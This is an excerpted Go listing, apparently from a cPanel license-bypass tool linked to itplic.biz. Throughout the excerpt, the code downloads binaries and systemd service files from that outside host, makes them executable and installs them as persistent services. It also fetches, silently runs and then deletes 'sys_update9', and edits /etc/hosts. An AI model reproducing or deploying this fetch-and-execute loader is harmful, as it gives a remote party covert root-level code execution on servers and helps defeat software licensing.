...
func CPSLicCP_checker() {
	if _, err := os.Stat("/etc/systemd/system/CPSLicCP.service"); err == nil {
		...
		downloadFile("/usr/bin/CPSLicCP", "https://itplic.biz/api/files/cpanel/CPSLicCP")
		chmod("/usr/bin/CPSLicCP")
		downloadFile("/etc/systemd/system/CPSLicCP.service", "https://itplic.biz/api/files/cpanel/cpslicservice")
...
func exec_license() {
	...
	urls := []string{
		...
		"http://cpanel.itplic.biz/cpsrvdv2",
		"https://cpanel.itplic.biz/9/binary",
		"https://cpanel.itplic.biz/9/binary",
		"https://cpanel.itplic.biz/9/binary",
		"https://cpanel.itplic.biz/9/binary",
	...
	_exec("sed -i /easyserver.pro/d /etc/hosts")
	...
	if _, err := os.Stat("/usr/local/RCBIN/icore/socket.so.1"); err == nil {
		...
		downloadFile("/usr/local/RCBIN/icore/socket.so.1", "https://itplic.biz/api/files/cpanel/cpanelv5/socket.so.1")
	}
	...
	_exec("wget -O /usr/local/cps/cpanel/sys_update itplic.biz/api/files/cpanel/socket/sys_update > /dev/null 2>&1")
	...
	_exec("wget -O /usr/local/cps/data/sys_update9 itplic.biz/api/files/cpanel/socket/sys_update9 > /dev/null 2>&1")
	_exec("chmod +x /usr/local/cps/data/sys_update9 > /dev/null 2>&1")
	_exec("/usr/local/cps/data/sys_update9 > /dev/null 2>&1")
	_exec("rm -rf /usr/local/cps/data/sys_update9 > /dev/null 2>&1")
	...
	if !postt1 {
		...
		urll := "https://itplic.biz/services/repo/cpanel/updaterc.php"
...
func installssl() {
	...
	if f.Status == "success" {
		...
		execCommand("wget -O /usr/local/cps/cpanel/sslfix.php https://itplic.biz/api/files/cpanel/sslfix.php > /dev/null 2>&1")
...
func file_checker() {
	if _, err := os.Stat("/usr/bin/lic_cpanel"); err == nil {
		...
		downloadFile("/usr/bin/lic_cpanel", "http://itplic.biz/api/files/cpanel/lic_cpanel")
...
func cpcCP_checker() {
	if _, err := os.Stat("/etc/systemd/system/cpcCP.service"); err == nil {
		...
		downloadFile("/usr/bin/cpcCP", "http://itplic.biz/api/files/cpanel/cpcCP")
		chmod("/usr/bin/cpcCP")
		downloadFile("/etc/systemd/system/cpcCP.service", "http://itplic.biz/api/files/cpanel/cpcservice")
		cmd2 := exec.Command("systemctl", "daemon-reload")
		err2 := cmd2.Run()
		if err2 != nil {
...
func cpanel_checker() {
	if _, err := os.Stat("/usr/local/cpanel/cpconf"); err == nil {
		...
		downloadFile("/home/cpinstall", "http://itplic.biz/api/files/cpanel/cpinstall")
